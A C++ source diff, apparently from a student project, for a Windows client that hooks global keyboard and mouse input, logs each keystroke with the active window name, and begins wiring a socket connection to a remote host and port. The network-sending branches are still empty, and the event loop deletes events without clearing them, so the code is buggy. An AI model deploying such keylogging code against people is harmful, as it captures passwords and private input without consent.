@@ -258,7 +258,15 @@ std::string gVirtualKeyCode[255][3] = {
 };
 extern Client clt;
 
-Client::Client() : m_Alt(false), m_Shift(false), m_Ctrl(false), m_CapsLock(false), m_AltGr(false)
+Client::Client() : m_Alt(false), m_Shift(false), m_Ctrl(false), m_CapsLock(false), m_AltGr(false),
+	m_time("Time_Windows.dll"),
+	m_socket("Socket_Windows.dll"),
+	m_protocol("protocolv1.dll"),
+	m_new_itime(m_time.get_symbole<fct_new_itime>(NAME_FCT_NEW_ITIME)),
+    m_iselect(m_socket.get_symbole<fct_iselect>(NAME_FCT_ISELECT)),
+	m_new_iclient(m_socket.get_symbole<fct_new_iclient>(NAME_FCT_NEW_ICLIENT)),
+	m_new_iprotocol(m_protocol.get_symbole<fct_new_iprotocol>(NAME_FCT_NEW_IPROTOCOL)),
+	m_itime(m_new_itime())
 {
 }
 
@@ -291,14 +299,29 @@ void		Client::unsetMouseHook(void)
 	unsetHook(m_mouseHook);
 }
 
-void		Client::sendBackMessage(void)
+void		Client::sendBackMessage(std::string const &host, std::string const &port)
 {
 	MSG		message;
-	
-	while (GetMessage(&message, NULL, 0, 0))
+	ITime	&time(m_new_itime());
+	IProtocol	&protocol(m_new_iprotocol(m_new_iclient(host, port), m_new_itime()));
+
+	time.set_second(1);
+	time.set_nano(0);
+	while (true)
 	{
-		TranslateMessage(&message);
-		DispatchMessage(&message);
+		if (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))
+		{
+			TranslateMessage(&message);
+			DispatchMessage(&message);
+		}
+		for (auto it = m_events.begin(); it != m_events.end(); it++)
+		{
+			if ((*it)->getType() == Keyboard)
+				;
+			else if ((*it)->getType() == Mouse)
+				;
+			delete *it;
+		}
 	}
 }
 
@@ -361,7 +384,7 @@ int		Client::getMod(void)
 	return (0);
 }
 
-void		Client::addEvent(Event &e)
+void		Client::addEvent(Event *e)
 {
 	m_events.push_back(e);
 }
@@ -484,9 +507,9 @@ LRESULT CALLBACK	KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lP
 			etype = Pressed;
 		else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
 			etype = Released;
-
-		KeyboardEvent kbEv(key, mod, etype, hookInfo->time, winName);
-		std::cout << kbEv.toString() << std::endl;
+		clt.m_itime.now();
+		KeyboardEvent *kbEv = new KeyboardEvent(key, mod, etype, clt.m_itime.get_second(), clt.m_itime.get_nano(), winName);
+		std::cout << kbEv->toString() << std::endl;
 		clt.addEvent(kbEv);
 	}
 	return (CallNextHookEx(NULL, nCode, wParam, lParam));
@@ -534,8 +557,10 @@ LRESULT CALLBACK MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lPara
 				break;
 		}
 		Button button(name, hookInfo->mouseData);
-		MouseEvent msEv = MouseEvent(button, pos, etype, hookInfo->time, getWindowName());
-		std::cout << msEv.toString() << std::endl;
+
+		clt.m_itime.now();
+		MouseEvent *msEv = new MouseEvent(button, pos, etype, clt.m_itime.get_second(), clt.m_itime.get_nano(), getWindowName());
+		std::cout << msEv->toString() << std::endl;
 		clt.addEvent(msEv);
 	}
 	return (CallNextHookEx(NULL, nCode, wParam, lParam));
